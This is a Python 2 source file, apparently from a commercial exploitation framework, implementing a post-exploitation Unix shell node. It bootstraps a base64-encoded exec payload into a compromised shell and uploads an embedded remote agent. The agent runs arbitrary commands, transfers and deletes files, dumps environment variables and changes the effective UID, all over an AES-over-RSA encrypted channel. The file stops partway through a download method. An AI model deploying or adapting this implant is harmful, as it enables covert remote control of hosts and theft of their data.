# the beginnings of a more flexible unix shell node

NOTES = """
Example with a shell on socket s:

    tn = Telnet()
    tn.sock = s
    node = unixShellNode.unixShellNode()
    node.parentnode = self.argsDict['passednodes'][0]
    node.shell = pythonUnixShellServer(pythonShellFromTelnet(tn))

"""

import base64
import time
import os
import stat

from shellserver import shellserver
from exploitutils import *
from internal import *
from canvaserror import *

# this is the python handling the shell on the remote end
PYSHELL = """ 
import base64

# AES stuff from tlslite

class AES:
    def __init__(self, key, mode, IV, implementation):
        if len(key) not in (16, 24, 32):
            raise AssertionError()
        if mode != 2:
            raise AssertionError()
        if len(IV) != 16: 
            raise AssertionError()
        self.isBlockCipher = True
        self.block_size = 16
        self.implementation = implementation
        if len(key)==16:
            self.name = "aes128"
        elif len(key)==24:
            self.name = "aes192"
        elif len(key)==32:
            self.name = "aes256"
        else:
            print "Length of key not recognized: %s"%len(key)
            raise AssertionError()
    def encrypt(self, plaintext):
        assert(len(plaintext) % 16 == 0)
    def decrypt(self, ciphertext):
        assert(len(ciphertext) % 16 == 0)

import copy
import string
import os

if os.name != "java":
    import exceptions
    if hasattr(exceptions, "FutureWarning"):
        import warnings
        warnings.filterwarnings("ignore", category=FutureWarning, append=1)

shifts = [[[0, 0], [1, 3], [2, 2], [3, 1]],
          [[0, 0], [1, 5], [2, 4], [3, 3]],
          [[0, 0], [1, 7], [3, 5], [4, 4]]]

num_rounds = {16: {16: 10, 24: 12, 32: 14}, 24: {16: 12, 24: 12, 32: 14}, 32: {16: 14, 24: 14, 32: 14}}

A = [[1, 1, 1, 1, 1, 0, 0, 0], 
     [0, 1, 1, 1, 1, 1, 0, 0], 
     [0, 0, 1, 1, 1, 1, 1, 0], 
     [0, 0, 0, 1, 1, 1, 1, 1], 
     [1, 0, 0, 0, 1, 1, 1, 1],
     [1, 1, 0, 0, 0, 1, 1, 1],
     [1, 1, 1, 0, 0, 0, 1, 1],
     [1, 1, 1, 1, 0, 0, 0, 1]]

alog = [1]
for i in xrange(255):
    j = (alog[-1] << 1) ^ alog[-1]
    if j & 0x100 != 0:
        j ^= 0x11B
    alog.append(j)
log = [0] * 256
for i in xrange(1, 255):
    log[alog[i]] = i
def mul(a, b):
    if a == 0 or b == 0:
        return 0
    return alog[(log[a & 0xFF] + log[b & 0xFF]) % 255]
box = [[0] * 8 for i in xrange(256)]
box[1][7] = 1
for i in xrange(2, 256):
    j = alog[255 - log[i]]
    for t in xrange(8):
        box[i][t] = (j >> (7 - t)) & 0x01
B = [0, 1, 1, 0, 0, 0, 1, 1]
cox = [[0] * 8 for i in xrange(256)]
for i in xrange(256):
    for t in xrange(8):
        cox[i][t] = B[t]
        for j in xrange(8):
            cox[i][t] ^= A[t][j] * box[i][j]
S =  [0] * 256
Si = [0] * 256
for i in xrange(256):
    S[i] = cox[i][0] << 7
    for t in xrange(1, 8):
        S[i] ^= cox[i][t] << (7-t)
    Si[S[i] & 0xFF] = i
G = [[2, 1, 1, 3],
    [3, 2, 1, 1],
    [1, 3, 2, 1],
    [1, 1, 3, 2]]
AA = [[0] * 8 for i in xrange(4)]
for i in xrange(4):
    for j in xrange(4):
        AA[i][j] = G[i][j]
        AA[i][i+4] = 1
for i in xrange(4):
    pivot = AA[i][i]
    if pivot == 0:
        t = i + 1
        while AA[t][i] == 0 and t < 4:
            t += 1
            assert t != 4, 'G matrix must be invertible'
            for j in xrange(8):
                AA[i][j], AA[t][j] = AA[t][j], AA[i][j]
            pivot = AA[i][i]
    for j in xrange(8):
        if AA[i][j] != 0:
            AA[i][j] = alog[(255 + log[AA[i][j] & 0xFF] - log[pivot & 0xFF]) % 255]
    for t in xrange(4):
        if i != t:
            for j in xrange(i+1, 8):
                AA[t][j] ^= mul(AA[i][j], AA[t][i])
            AA[t][i] = 0
iG = [[0] * 4 for i in xrange(4)]
for i in xrange(4):
    for j in xrange(4):
        iG[i][j] = AA[i][j + 4]
def mul4(a, bs):
    if a == 0:
        return 0
    r = 0
    for b in bs:
        r <<= 8
        if b != 0:
            r = r | mul(a, b)
    return r
T1 = []
T2 = []
T3 = []
T4 = []
T5 = []
T6 = []
T7 = []
T8 = []
U1 = []
U2 = []
U3 = []
U4 = []
for t in xrange(256):
    s = S[t]
    T1.append(mul4(s, G[0]))
    T2.append(mul4(s, G[1]))
    T3.append(mul4(s, G[2]))
    T4.append(mul4(s, G[3]))
    s = Si[t]
    T5.append(mul4(s, iG[0]))
    T6.append(mul4(s, iG[1]))
    T7.append(mul4(s, iG[2]))
    T8.append(mul4(s, iG[3]))
    U1.append(mul4(t, iG[0]))
    U2.append(mul4(t, iG[1]))
    U3.append(mul4(t, iG[2]))
    U4.append(mul4(t, iG[3]))
rcon = [1]
r = 1
for t in xrange(1, 30):
    r = mul(2, r)
    rcon.append(r)
del A
del AA
del pivot
del B
del G
del box
del log
del alog
del i
del j
del r
del s
del t
del mul
del mul4
del cox
del iG
class rijndael:
    def __init__(self, key, block_size = 16):
        if block_size != 16 and block_size != 24 and block_size != 32:
            raise ValueError('Invalid block size: ' + str(block_size))
        if len(key) != 16 and len(key) != 24 and len(key) != 32:
            raise ValueError('Invalid key size: ' + str(len(key)))
        self.block_size = block_size

        ROUNDS = num_rounds[len(key)][block_size]
        BC = block_size / 4
        # encryption round keys
        Ke = [[0] * BC for i in xrange(ROUNDS + 1)]
        # decryption round keys
        Kd = [[0] * BC for i in xrange(ROUNDS + 1)]
        ROUND_KEY_COUNT = (ROUNDS + 1) * BC
        KC = len(key) / 4

        # copy user material bytes into temporary ints
        tk = []
        for i in xrange(0, KC):
            tk.append((ord(key[i * 4]) << 24) | (ord(key[i * 4 + 1]) << 16) |
                (ord(key[i * 4 + 2]) << 8) | ord(key[i * 4 + 3]))

        # copy values into round key arrays
        t = 0
        j = 0
        while j < KC and t < ROUND_KEY_COUNT:
            Ke[t / BC][t % BC] = tk[j]
            Kd[ROUNDS - (t / BC)][t % BC] = tk[j]
            j += 1
            t += 1
        tt = 0
        rconpointer = 0
        while t < ROUND_KEY_COUNT:
            # extrapolate using phi (the round key evolution function)
            tt = tk[KC - 1]
            tk[0] ^= (S[(tt >> 16) & 0xFF] & 0xFF) << 24 ^  \\
                     (S[(tt >>  8) & 0xFF] & 0xFF) << 16 ^  \\
                     (S[ tt        & 0xFF] & 0xFF) <<  8 ^  \\
                     (S[(tt >> 24) & 0xFF] & 0xFF)       ^  \\
                     (rcon[rconpointer]    & 0xFF) << 24
            rconpointer += 1
            if KC != 8:
                for i in xrange(1, KC):
                    tk[i] ^= tk[i-1]
            else:
                for i in xrange(1, KC / 2):
                    tk[i] ^= tk[i-1]
                tt = tk[KC / 2 - 1]
                tk[KC / 2] ^= (S[ tt        & 0xFF] & 0xFF)       ^ \\
                              (S[(tt >>  8) & 0xFF] & 0xFF) <<  8 ^ \\
                              (S[(tt >> 16) & 0xFF] & 0xFF) << 16 ^ \\
                              (S[(tt >> 24) & 0xFF] & 0xFF) << 24
                for i in xrange(KC / 2 + 1, KC):
                    tk[i] ^= tk[i-1]
            # copy values into round key arrays
            j = 0
            while j < KC and t < ROUND_KEY_COUNT:
                Ke[t / BC][t % BC] = tk[j]
                Kd[ROUNDS - (t / BC)][t % BC] = tk[j]
                j += 1
                t += 1
        # inverse MixColumn where needed
        for r in xrange(1, ROUNDS):
            for j in xrange(BC):
                tt = Kd[r][j]
                Kd[r][j] = U1[(tt >> 24) & 0xFF] ^ \\
                           U2[(tt >> 16) & 0xFF] ^ \\
                           U3[(tt >>  8) & 0xFF] ^ \\
                           U4[ tt        & 0xFF]
        self.Ke = Ke
        self.Kd = Kd

    def encrypt(self, plaintext):
        if len(plaintext) != self.block_size:
            raise ValueError('wrong block length, expected ' + str(self.block_size) + ' got ' + str(len(plaintext)))
        Ke = self.Ke
        BC = self.block_size / 4
        ROUNDS = len(Ke) - 1
        if BC == 4:
            SC = 0
        elif BC == 6:
            SC = 1
        else:
            SC = 2
        s1 = shifts[SC][1][0]
        s2 = shifts[SC][2][0]
        s3 = shifts[SC][3][0]
        a = [0] * BC
        # temporary work array
        t = []
        # plaintext to ints + key
        for i in xrange(BC):
            t.append((ord(plaintext[i * 4    ]) << 24 |
                      ord(plaintext[i * 4 + 1]) << 16 |
                      ord(plaintext[i * 4 + 2]) <<  8 |
                      ord(plaintext[i * 4 + 3])        ) ^ Ke[0][i])
        # apply round transforms
        for r in xrange(1, ROUNDS):
            for i in xrange(BC):
                a[i] = (T1[(t[ i           ] >> 24) & 0xFF] ^
                        T2[(t[(i + s1) % BC] >> 16) & 0xFF] ^
                        T3[(t[(i + s2) % BC] >>  8) & 0xFF] ^
                        T4[ t[(i + s3) % BC]        & 0xFF]  ) ^ Ke[r][i]
            t = copy.copy(a)
        # last round is special
        result = []
        for i in xrange(BC):
            tt = Ke[ROUNDS][i]
            result.append((S[(t[ i           ] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
            result.append((S[(t[(i + s1) % BC] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
            result.append((S[(t[(i + s2) % BC] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
            result.append((S[ t[(i + s3) % BC]        & 0xFF] ^  tt       ) & 0xFF)
        return string.join(map(chr, result), '')

    def decrypt(self, ciphertext):
        if len(ciphertext) != self.block_size:
            raise ValueError('wrong block length, expected ' + str(self.block_size) + ' got ' + str(len(plaintext)))
        Kd = self.Kd
        BC = self.block_size / 4
        ROUNDS = len(Kd) - 1
        if BC == 4:
            SC = 0
        elif BC == 6:
            SC = 1
        else:
            SC = 2
        s1 = shifts[SC][1][1]
        s2 = shifts[SC][2][1]
        s3 = shifts[SC][3][1]
        a = [0] * BC
        # temporary work array
        t = [0] * BC
        # ciphertext to ints + key
        for i in xrange(BC):
            t[i] = (ord(ciphertext[i * 4    ]) << 24 |
                    ord(ciphertext[i * 4 + 1]) << 16 |
                    ord(ciphertext[i * 4 + 2]) <<  8 |
                    ord(ciphertext[i * 4 + 3])        ) ^ Kd[0][i]
        # apply round transforms
        for r in xrange(1, ROUNDS):
            for i in xrange(BC):
                a[i] = (T5[(t[ i           ] >> 24) & 0xFF] ^
                        T6[(t[(i + s1) % BC] >> 16) & 0xFF] ^
                        T7[(t[(i + s2) % BC] >>  8) & 0xFF] ^
                        T8[ t[(i + s3) % BC]        & 0xFF]  ) ^ Kd[r][i]
            t = copy.copy(a)
        # last round is special
        result = []
        for i in xrange(BC):
            tt = Kd[ROUNDS][i]
            result.append((Si[(t[ i           ] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
            result.append((Si[(t[(i + s1) % BC] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
            result.append((Si[(t[(i + s2) % BC] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
            result.append((Si[ t[(i + s3) % BC]        & 0xFF] ^  tt       ) & 0xFF)
        return string.join(map(chr, result), '')

import array

def createByteArraySequence(seq):
    return array.array('B', seq)

def createByteArrayZeros(howMany):
    return array.array('B', [0] * howMany)

def concatArrays(a1, a2):
    return a1+a2

def bytesToString(bytes):
    return bytes.tostring()

def stringToBytes(s):
    bytes = createByteArrayZeros(0)
    bytes.fromstring(s)
    return bytes

def new(key, mode, IV):
    return Python_AES(key, mode, IV)

class Python_AES(AES):
    def __init__(self, key, mode, IV):
        AES.__init__(self, key, mode, IV, "python")
        self.rijndael = rijndael(key, 16)
        self.IV = IV

    def encrypt(self, plaintext):
        AES.encrypt(self, plaintext)
        plaintextBytes = stringToBytes(plaintext)
        chainBytes = stringToBytes(self.IV)
        #CBC Mode: For each block...
        for x in range(len(plaintextBytes)/16):
            #XOR with the chaining block
            blockBytes = plaintextBytes[x*16 : (x*16)+16]
            for y in range(16):
                blockBytes[y] ^= chainBytes[y]
            blockString = bytesToString(blockBytes)
            #Encrypt it
            encryptedBytes = stringToBytes(self.rijndael.encrypt(blockString))
            #Overwrite the input with the output
            for y in range(16):
                plaintextBytes[(x*16)+y] = encryptedBytes[y]
            #Set the next chaining block
            chainBytes = encryptedBytes
        self.IV = bytesToString(chainBytes)
        return bytesToString(plaintextBytes)

    def decrypt(self, ciphertext):
        AES.decrypt(self, ciphertext)
        ciphertextBytes = stringToBytes(ciphertext)
        chainBytes = stringToBytes(self.IV)
        #CBC Mode: For each block...
        for x in range(len(ciphertextBytes)/16):
            #Decrypt it
            blockBytes = ciphertextBytes[x*16 : (x*16)+16]
            blockString = bytesToString(blockBytes)
            decryptedBytes = stringToBytes(self.rijndael.decrypt(blockString))
            #XOR with the chaining block and overwrite the input with output
            for y in range(16):
                decryptedBytes[y] ^= chainBytes[y]
                ciphertextBytes[(x*16)+y] = decryptedBytes[y]
            #Set the next chaining block
            chainBytes = blockBytes
        self.IV = bytesToString(chainBytes)
        return bytesToString(ciphertextBytes)

# RSA stuff

# taken from Python Cryptography Toolkit

import types
import warnings
import struct
import sys

bignum = long
_fastmath = None

def size (N):
    bits, power = 0,1L
    while N >= power:
        bits += 1
        power = power << 1
    return bits

def getRandomNumber(N, randfunc):
    S = randfunc(N/8)
    odd_bits = N % 8
    if odd_bits != 0:
        char = ord(randfunc(1)) >> (8-odd_bits)
        S = chr(char) + S
    value = bytes_to_long(S)
    value |= 2L ** (N-1)                # Ensure high bit is set
    assert size(value) >= N
    return value

def GCD(x,y):
    x = abs(x) ; y = abs(y)
    while x > 0:
        x, y = y % x, x
    return y

def inverse(u, v):
    u3, v3 = long(u), long(v)
    u1, v1 = 1L, 0L
    while v3 > 0:
        q=u3 / v3
        u1, v1 = v1, u1 - v1*q
        u3, v3 = v3, u3 - v3*q
    while u1<0:
        u1 = u1 + v
    return u1

def getPrime(N, randfunc):
    number=getRandomNumber(N, randfunc) | 1
    while (not isPrime(number)):
        number=number+2
    return number

def isPrime(N):
    if N == 1:
        return 0
    if N in sieve:
        return 1
    for i in sieve:
        if (N % i)==0:
            return 0

    # Use the accelerator if available
    if _fastmath is not None:
        return _fastmath.isPrime(N)

    # Compute the highest bit that's set in N
    N1 = N - 1L
    n = 1L
    while (n<N):
        n=n<<1L
    n = n >> 1L

    # Rabin-Miller test
    for c in sieve[:7]:
        a=long(c) ; d=1L ; t=n
        while (t):  # Iterate over the bits in N1
            x=(d*d) % N
            if x==1L and d!=1L and d!=N1:
                return 0  # Square root of 1 found
            if N1 & t:
                d=(x*a) % N
            else:
                d=x
            t = t >> 1L
        if d!=1L:
            return 0
    return 1

sieve=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59,
       61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127,
       131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193,
       197, 199, 211, 223, 227, 229, 233, 239, 241, 251]

def long_to_bytes(n, blocksize=0):
    # after much testing, this algorithm was deemed to be the fastest
    s = ''
    n = long(n)
    pack = struct.pack
    while n > 0:
        s = pack('>I', n & 0xffffffffL) + s
        n = n >> 32
    # strip off leading zeros
    for i in range(len(s)):
        if s[i] != '\\000':
            break
    else:
        # only happens when n == 0
        s = '\\000'
        i = 0
    s = s[i:]
    # add back some pad bytes.  this could be done more efficiently w.r.t. the
    # de-padding being done above, but sigh...
    if blocksize > 0 and len(s) % blocksize:
        s = (blocksize - len(s) % blocksize) * '\\000' + s
    return s

def bytes_to_long(s):
    acc = 0L
    unpack = struct.unpack
    length = len(s)
    if length % 4:
        extra = (4 - length % 4)
        s = '\\000' * extra + s
        length = length + extra
    for i in range(0, length, 4):
        acc = (acc << 32) + unpack('>I', s[i:i+4])[0]
    return acc

# For backwards compatibility...
def long2str(n, blocksize=0):
    warnings.warn("long2str() has been replaced by long_to_bytes()")
    return long_to_bytes(n, blocksize)
def str2long(s):
    warnings.warn("str2long() has been replaced by bytes_to_long()")
    return bytes_to_long(s)

# Basic public key class
class pubkey:
    def __init__(self):
        pass

    def __getstate__(self):
        d=self.__dict__
        for key in self.keydata:
            if d.has_key(key): d[key]=long(d[key])
        return d

    def __setstate__(self, d):
        for key in self.keydata:
            if d.has_key(key): self.__dict__[key]=bignum(d[key])

    def encrypt(self, plaintext, K):
        wasString=0
        if isinstance(plaintext, types.StringType):
            plaintext=bytes_to_long(plaintext) ; wasString=1
        if isinstance(K, types.StringType):
            K=bytes_to_long(K)
        ciphertext=self._encrypt(plaintext, K)
        if wasString: return tuple(map(long_to_bytes, ciphertext))
        else: return ciphertext

    def decrypt(self, ciphertext):
        wasString=0
        if not isinstance(ciphertext, types.TupleType):
            ciphertext=(ciphertext,)
        if isinstance(ciphertext[0], types.StringType):
            ciphertext=tuple(map(bytes_to_long, ciphertext)) ; wasString=1
        plaintext=self._decrypt(ciphertext)
        if wasString: return long_to_bytes(plaintext)
        else: return plaintext

    def sign(self, M, K):
        if (not self.has_private()):
            raise error, 'Private key not available in this object'
        if isinstance(M, types.StringType): M=bytes_to_long(M)
        if isinstance(K, types.StringType): K=bytes_to_long(K)
        return self._sign(M, K)

    def verify (self, M, signature):
        if isinstance(M, types.StringType): M=bytes_to_long(M)
        return self._verify(M, signature)

    # alias to compensate for the old validate() name
    def validate (self, M, signature):
        warnings.warn("validate() method name is obsolete; use verify()",
                      DeprecationWarning)

    def blind(self, M, B):
        wasString=0
        if isinstance(M, types.StringType):
            M=bytes_to_long(M) ; wasString=1
        if isinstance(B, types.StringType): B=bytes_to_long(B)
        blindedmessage=self._blind(M, B)
        if wasString: return long_to_bytes(blindedmessage)
        else: return blindedmessage

    def unblind(self, M, B):
        wasString=0
        if isinstance(M, types.StringType):
            M=bytes_to_long(M) ; wasString=1
        if isinstance(B, types.StringType): B=bytes_to_long(B)
        unblindedmessage=self._unblind(M, B)
        if wasString: return long_to_bytes(unblindedmessage)
        else: return unblindedmessage


    # The following methods will usually be left alone, except for
    # signature-only algorithms.  They both return Boolean values
    # recording whether this key's algorithm can sign and encrypt.
    def can_sign (self):
        return 1

    def can_encrypt (self):
        return 1

    def can_blind (self):
        return 0

    # The following methods will certainly be overridden by
    # subclasses.

    def size (self):
        return 0

    def has_private (self):
        return 0

    def publickey (self):
        return self

    def __eq__ (self, other):
        return self.__getstate__() == other.__getstate__()

class error (Exception):
    pass

def generate(bits, randfunc, progress_func=None):
    obj=RSAobj()

    # Generate the prime factors of n
    if progress_func:
        progress_func('p,q\\n')
    p = q = 1L
    while size(p*q) < bits:
        p = getPrime(bits/2, randfunc)
        q = getPrime(bits/2, randfunc)

    # p shall be smaller than q (for calc of u)
    if p > q:
        (p, q)=(q, p)
    obj.p = p
    obj.q = q

    if progress_func:
        progress_func('u\\n')
    obj.u = inverse(obj.p, obj.q)
    obj.n = obj.p*obj.q

    obj.e = 65537L
    if progress_func:
        progress_func('d\\n')
    obj.d=inverse(obj.e, (obj.p-1)*(obj.q-1))

    assert bits <= 1+obj.rsa_size(), "Generated key is too small"

    return obj

def construct(tuple):
    obj=RSAobj()
    if len(tuple) not in [2,3,5,6]:
        raise error, 'argument for construct() wrong length'
    for i in range(len(tuple)):
        field = obj.keydata[i]
        setattr(obj, field, tuple[i])
    if len(tuple) >= 5:
        # Ensure p is smaller than q 
        if obj.p>obj.q:
            (obj.p, obj.q)=(obj.q, obj.p)

    if len(tuple) == 5:
        # u not supplied, so we're going to have to compute it.
        obj.u=inverse(obj.p, obj.q)

    return obj

class RSAobj(pubkey):
    keydata = ['n', 'e', 'd', 'p', 'q', 'u']
    def _encrypt(self, plaintext, K=''):
        if self.n<=plaintext:
            raise error, 'Plaintext too large'
        return (pow(plaintext, self.e, self.n),)

    def _decrypt(self, ciphertext):
        if (not hasattr(self, 'd')):
            raise error, 'Private key not available in this object'
        if self.n<=ciphertext[0]:
            raise error, 'Ciphertext too large'
        return pow(ciphertext[0], self.d, self.n)

    def _sign(self, M, K=''):
        return (self._decrypt((M,)),)

    def _verify(self, M, sig):
        m2=self._encrypt(sig[0])
        if m2[0]==M:
            return 1
        else: return 0

    def _blind(self, M, B):
        tmp = pow(B, self.e, self.n)
        return (M * tmp) % self.n

    def _unblind(self, M, B):
        tmp = inverse(B, self.n)
        return  (M * tmp) % self.n

    def can_blind (self):
        return 1

    def rsa_size(self):
        return size(self.n) - 1

    def has_private(self):
        if hasattr(self, 'd'):
            return 1
        else: return 0

    def publickey(self, n = None, e = None):
        if n != None and e != None:
            return construct((n, e))
        else:
            return construct((self.n, self.e))

class Encoding:

    def __init__(self):
        self.encrypt = None
        self.decrypt = None

    def init_aes(self, key, iv):
        self.encrypt = Python_AES(key, 2, iv).encrypt
        self.decrypt = Python_AES(key, 2, iv).decrypt

    def encode(self, data):
        if self.encrypt != None:
            i = 0 
            if (len(data) + 2) % 16: 
                i = 16 - ((len(data) + 2) % 16) 
            data += '\\x00' * i 
            data = self.encrypt('%.2d' % i + data)
        return base64.b64encode(data)

    def decode(self, data):
        data = base64.b64decode(data)
        if self.decrypt != None:
            data = self.decrypt(data)
            try:
                data = data[2:-int(data[:2])] # take off any padding
            except:
                data = ''
        return data

import sys
import os
import stat
import time

class XUnsup(Exception):

    def __init__(self, v):
        self.v = v

    def __str__(self):
        return repr(self.v)

class PythonShell:

    def __init__(self):
        self.encoder = Encoding()
        self.cmd_map = {
            'download' : (self.download, '<path>'),
            'upload' : (self.upload, '<path>'),
            'unlink' : (self.unlink, '<path>'),
            'chdir' : (self.chdir, '<path>'),
            'getcwd' : (self.getcwd, ''),
            'getegid' : (self.getegid, ''),
            'geteuid' : (self.geteuid, ''),
            'seteuid' : (self.seteuid, ''),
            'getgid' : (self.getgid, ''),
            'getpid' : (self.getpid, ''),
            'getppid' : (self.getppid, ''),
            'popen' : (self.popen, '<command>'),
            'environ' : (self.environ, ''),
            'ctermid' : (self.ctermid, ''),
            'help' : (self.help, ''),
            'init_rsa' : (self.init_rsa, ''),
            'init_aes' : (self.init_aes, '')
            }
        self.rsa = None

    def init_rsa(self, args):
        try:
            rand = open('/dev/urandom', 'r')
            self.rsa = generate(2048, rand.read)
        except:
            raise XUnsup, 'RSA failed'
        return '%s,%s' % (self.rsa.n, self.rsa.e)

    def init_aes(self, args):
        data = ' '.join(args)
        try:
            raw = base64.b64decode(data)
            raw = self.rsa.decrypt((raw,))
            key = raw[:16]
            iv = raw[16:]
            self.encoder.init_aes(key, iv)
        except:
            raise XUnsup, 'AES failed'
        return 'succeeded'

    def help(self, args):
        for cmd in self.cmd_map:
            print '%s %s' % (cmd, self.cmd_map[cmd][1])
        return

    def unlink(self, args):
        path = ' '.join(args)
        try:
            os.unlink(path)
            return 'Succeeded'
        except:
            raise XUnsup, 'Unlink failed'

    def download(self, args):
        path = ' '.join(args)
        f = None
        try:
            st_size = os.stat(path)[stat.ST_SIZE]
            f = open(path, 'rb')
            sys.stdout.write('0x%.8x*' % st_size)
            sys.stdout.flush()
            while st_size:
                c = f.read(1024)
                sys.stdout.write(self.encoder.encode(c)+'*')
                sys.stdout.flush()
                st_size -= len(c)
        except:
            sys.stdout.write('*')
            sys.stdout.flush()
            return 'Failed'
        if hasattr(f, 'close'):
            f.close()
        return 'Succeeded'

    def upload(self, args):
        path = ' '.join(args)
        f = None
        try:
            f = open(path, 'wb')
            n = ''
            while '*' not in n:
                n += sys.stdin.read(1)
            n = int(self.encoder.decode(n[:-1]), 16)
            while n:
                r = ''
                while '*' not in r:
                    r += sys.stdin.read(1)
                data = self.encoder.decode(r[:-1])
                if data and len(data):
                    f.write(data)
                    n -= len(data)
            f.close()
        except:
            return 'Failed'
        return 'Succeeded'
                    
    def environ(self, args):
        if hasattr(os, 'environ') == True:
            flat = ''
            for env in os.environ:
                flat += '%s=%s\\n' % (env,os.environ[env])
            return flat
        else:
            raise XUnsup, 'Not supported'

    def ctermid(self, args):
        if hasattr(os, 'ctermid') == True:
            return os.ctermid()
        else:
            raise XUnsup, 'Not supported'

    def chdir(self, args):
        path = ' '.join(args)
        if hasattr(os, 'chdir') == True:
            os.chdir(path)
            return 'Succeeded'
        else:
            raise XUnsup, 'Not supported'

    def getcwd(self, args):
        if hasattr(os, 'getcwd') == True:
            return os.getcwd()
        else:
            raise XUnsup, 'Not supported'

    def getpid(self, args):
        if hasattr(os, 'getpid') == True:
            return '%s' % os.getpid()
        else:
            raise XUnsup, 'Not supported'

    def getppid(self, args):
        if hasattr(os, 'getppid') == True:
            return '%s' % os.getppid()
        else:
            raise XUnsup, 'Not supported'

    def getegid(self, args):
        if hasattr(os, 'getegid') == True:
            return '%s' % os.getegid()
        else:
            raise XUnsup, 'Not supported'

    def getgid(self, args):
        if hasattr(os, 'getgid') == True:
            return '%s' % os.getgid()
        else:
            raise XUnsup, 'Not supported'

    def geteuid(self, args):
        if hasattr(os, 'geteuid') == True:
            return '%s' % os.geteuid()
        else:
            raise XUnsup, 'Not supported'

    def seteuid(self, args):
        try:
            euid = int(args[0])
        except:
            return 'Failed'
        if hasattr(os, 'seteuid') == True:
            try:
                os.seteuid(euid)
            except:
                return 'Failed'
            return 'Succeeded'
        else:
            raise XUnsup, 'Not supported'

    def popen(self, args):
        # stick with popen for backwards compatibility
        if hasattr(os, 'popen') == True:
            command = ' '.join(args)
            out = os.popen(command)
            data = ''
            for line in out.readlines():
                data += line
            return data
        else:
            raise XUnsup, 'Not supported'

    def parse_cmd(self, cmd):
        return cmd.split(' ')

    def interact(self, f=sys.stdin):
        while True:
            sys.stdout.write('>>> ')
            sys.stdout.flush()
            line = sys.stdin.readline()
            line = line[:-1]
            if not line:
                continue
            line = self.encoder.decode(line)
            if line in ['endshell']:
                sys.stdout.write('>>> ')
                sys.stdout.flush()
                break
            cmd = self.parse_cmd(line)
            if cmd[0] in self.cmd_map:
                data = ''
                try:
                    data = self.cmd_map[cmd[0]][0](cmd[1:])
                except XUnsup:
                    data = 'Command failed or not supported on target'
                except:
                    data = 'Unknown exception'
                if data:
                    sys.stdout.write('****' + '%s' % self.encoder.encode(data) + '\\n')
                else:
                    sys.stdout.write('****' + self.encoder.encode('<NODATA>') + '\\n')
                sys.stdout.flush()

PythonShell().interact()
"""

class Bootstrapper:
    """ bootstrap a (restricted) shell into a python shell """
    def __init__(self, tn):
        self.tn = tn
        self.INIT = """
import base64
import sys
import signal
signal.alarm(0) # cancel any scheduled alarms
n = int(sys.stdin.readline())
s = ''
while n:
    s += sys.stdin.read(1)
    n -= 1
s = base64.b64decode(s)
exec s
"""
        self.tn.write(self.bootstrap())

    def bootstrap(self):
        return 'python -c "import base64;s=base64.b64decode(\'%s\');exec s"\n' % base64.b64encode(self.INIT)

from pythonUnixShellCrypto import *

# to support the legacy interface ... this expects you inited the socket with telnetlib
class pythonShellFromTelnet:
    def __init__(self, tn):
        self.tn = tn
        self.bs = Bootstrapper(self.tn)
        pyshell = base64.b64encode(PYSHELL) 
        self.write('%s\n' % len(pyshell))
        n = len(pyshell)
        i = 0
        for i in range(0, n):
            self.write(pyshell[i])
        self.read_until('>>> ')

    def get_socket(self):
        return self.tn.get_socket()

    def get_fileno(self):
        return self.tn.fileno()

    def write(self, data):
        return self.tn.write(str(data))

    def read_until(self, marker):
        return self.tn.read_until(marker)

    def read_some(self):
        return self.tn.read_some()

class Encoding:

    def __init__(self):
        self.encrypt = None
        self.decrypt = None

    def init_aes(self, key, iv):
        self.encrypt = Python_AES(key, 2, iv).encrypt
        self.decrypt = Python_AES(key, 2, iv).decrypt

    def encode(self, data):
        if self.encrypt != None:
            i = 0
            if (len(data) + 2) % 16:
                i = 16 - ((len(data) + 2) % 16)
            data += '\x00' * i
            data = self.encrypt('%.2d' % i + data)
        return base64.b64encode(data)

    def decode(self, data):
        data = base64.b64decode(data)
        if self.decrypt != None:
            data = self.decrypt(data)
            try:
                data = data[2:-int(data[:2])] # take off any padding
            except:
                print '[!] CBC not synced? try again'
                data = ''
        return data

# a shellserver that's backwards compatible with MOSDEF api
class pythonUnixShellServer(shellserver):
    def __init__(self, shell, logfunction = None, crypto = True):
        self.shell = shell
        self.started = False
        shellserver.__init__(self, self.shell.get_socket(), type='Active', logfunction = logfunction)
        self.encoder = Encoding()
        self.prompt = '>>> '
        if crypto == True:
            self.init_crypto()

    # All /dev/urandom caveats apply, lacks authenticity assurance
    # Protocol leaks: prompt + encoding markers
    def init_crypto(self):
        print '[+] Setting up AES128 over RSA2048 ... this may take a while ...'
        data = self.cmd("init_rsa")
        if ',' in data:
            n = int(data.split(',')[0])
            e = int(data.split(',')[1])
            print '[+] Constructing RSA publickey'
            client_pub1 = rsa_construct((n, e))
        else:
            print '[-] RSA2048 failed'
            return False
        print '[+] RSA2048 succeeded ... initializing AES128'
        # XXX: we have to move this to something Windows compatible
        try:
            f = open('/dev/urandom', 'r')
            key = f.read(16)
            iv = f.read(16)
            f.close()
        except:
            print '[-] AES128 failed'
            return False
        # init the encoder on the remote and local ends
        self.shell.write(self.encoder.encode("init_aes " + base64.b64encode(client_pub1.encrypt(key+iv, '')[0]))+'\n')
        data = self.shell.read_until(self.prompt)
        data = data[:-len(self.prompt)] # nibble off the prompt
        self.encoder.init_aes(key, iv)
        if data.find('****') != -1: # we do this in case python itself is printing stuff on our pipe
            data = self.encoder.decode(data[data.find('****')+4:])
            print '[+] init_aes result %s' % data
        return True

    def startup(self):
        if self.started != True:
            self.started = True
        
    def pwd(self):
        """Prints current working directory"""
        return self.cmd("getcwd")

    def dounlink(self, path):
        return self.cmd("unlink "+path)

    # some places use shellcommand, some places use runcommand
    # LFkludge included for API backwards compatibility
    def shellcommand(self, command, LFkludge = False):
        # XXX: rv should indicate success of failure
        return self.cmd("popen " + command), 0

    def runcommand(self, command):
        if command in ['init_rsa']: # for testing commands
            return self.cmd(command)
        return self.cmd("popen " + command)

    def cmdline_download(self, src, dst='.'):
        """Downloads a remote file"""
        ts = '%s' % time.time()
        f = open('download_%s' % ts, 'wb')
        self.shell.write(self.encoder.encode("download " + src) + '\n')
